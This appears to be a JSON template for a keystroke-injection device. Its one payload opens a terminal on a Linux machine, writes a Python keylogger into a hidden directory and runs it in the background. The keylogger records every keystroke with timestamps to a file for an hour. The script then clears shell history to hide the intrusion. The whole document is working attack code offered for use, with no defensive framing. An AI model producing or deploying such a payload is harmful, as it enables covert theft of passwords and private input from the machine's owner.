{
  "metadata": {
    "name": "Linux Keylogger",
    "description": "Deploys a keylogger on Linux systems",
    "version": "1.0",
    "author": "Natasha AI"
  },
  "templates": [
    {
      "name": "Python Keylogger",
      "description": "Deploys a Python-based keylogger that saves keystrokes to a file",
      "attack_type": "keylogger",
      "script": [
        "REM Linux Python Keylogger",
        "REM Generated by Natasha AI",
        "DELAY 1000",
        "ALT F2",
        "DELAY 500",
        "STRING terminal",
        "DELAY 500",
        "ENTER",
        "DELAY 1000",
        "STRING mkdir -p ~/.local/scripts",
        "ENTER",
        "DELAY 300",
        "STRING cat > ~/.local/scripts/keylogger.py << 'EOF'",
        "ENTER",
        "STRING #!/usr/bin/env python3",
        "ENTER",
        "STRING # Linux keylogger using pynput",
        "ENTER",
        "STRING import os",
        "ENTER",
        "STRING import time",
        "ENTER",
        "STRING import datetime",
        "ENTER",
        "STRING import threading",
        "ENTER",
        "STRING",
        "ENTER",
        "STRING # Try to import pynput, install if not available",
        "ENTER",
        "STRING try:",
        "ENTER",
        "STRING     from pynput import keyboard",
        "ENTER",
        "STRING except ImportError:",
        "ENTER",
        "STRING     os.system('pip3 install --user pynput')",
        "ENTER",
        "STRING     from pynput import keyboard",
        "ENTER",
        "STRING",
        "ENTER",
        "STRING # Log file path",
        "ENTER",
        "STRING log_file = os.path.expanduser('~/.local/share/keylog.txt')",
        "ENTER",
        "STRING",
        "ENTER",
        "STRING # Ensure directory exists",
        "ENTER",
        "STRING os.makedirs(os.path.dirname(log_file), exist_ok=True)",
        "ENTER",
        "STRING",
        "ENTER",
        "STRING # Write initial log entry",
        "ENTER",
        "STRING with open(log_file, 'a') as f:",
        "ENTER",
        "STRING     f.write(f&quot;\\n\\n[{datetime.datetime.now()}] Keylogger started\\n&quot;)",
        "ENTER",
        "STRING",
        "ENTER",
        "STRING # Set up a timer to stop after 1 hour",
        "ENTER",
        "STRING stop_time = time.time() + 3600  # 1 hour",
        "ENTER",
        "STRING",
        "ENTER",
        "STRING def on_press(key):",
        "ENTER",
        "STRING     try:",
        "ENTER",
        "STRING         # Check if time is up",
        "ENTER",
        "STRING         if time.time() > stop_time:",
        "ENTER",
        "STRING             with open(log_file, 'a') as f:",
        "ENTER",
        "STRING                 f.write(f&quot;\\n[{datetime.datetime.now()}] Keylogger stopped\\n&quot;)",
        "ENTER",
        "STRING             return False  # Stop listener",
        "ENTER",
        "STRING",
        "ENTER",
        "STRING         # Get the key character",
        "ENTER",
        "STRING         if hasattr(key, 'char'):",
        "ENTER",
        "STRING             char = key.char",
        "ENTER",
        "STRING         else:",
        "ENTER",
        "STRING             char = f'[{key}]'",
        "ENTER",
        "STRING",
        "ENTER",
        "STRING         # Write to log file",
        "ENTER",
        "STRING         with open(log_file, 'a') as f:",
        "ENTER",
        "STRING             timestamp = datetime.datetime.now().strftime('%H:%M:%S')",
        "ENTER",
        "STRING             f.write(f&quot;[{timestamp}] {char}&quot;)",
        "ENTER",
        "STRING",
        "ENTER",
        "STRING     except Exception as e:",
        "ENTER",
        "STRING         with open(log_file, 'a') as f:",
        "ENTER",
        "STRING             f.write(f&quot;\\n[ERROR] {e}\\n&quot;)",
        "ENTER",
        "STRING",
        "ENTER",
        "STRING # Start the keylogger",
        "ENTER",
        "STRING with keyboard.Listener(on_press=on_press) as listener:",
        "ENTER",
        "STRING     listener.join()",
        "ENTER",
        "STRING EOF",
        "ENTER",
        "DELAY 300",
        "STRING chmod +x ~/.local/scripts/keylogger.py",
        "ENTER",
        "DELAY 300",
        "STRING nohup python3 ~/.local/scripts/keylogger.py > /dev/null 2>&1 &",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;Keylogger started. Logs saved to ~/.local/share/keylog.txt&quot;",
        "ENTER",
        "DELAY 300",
        "STRING history -c",
        "ENTER",
        "DELAY 300",
        "STRING exit",
        "ENTER"
      ]
    }
  ]
}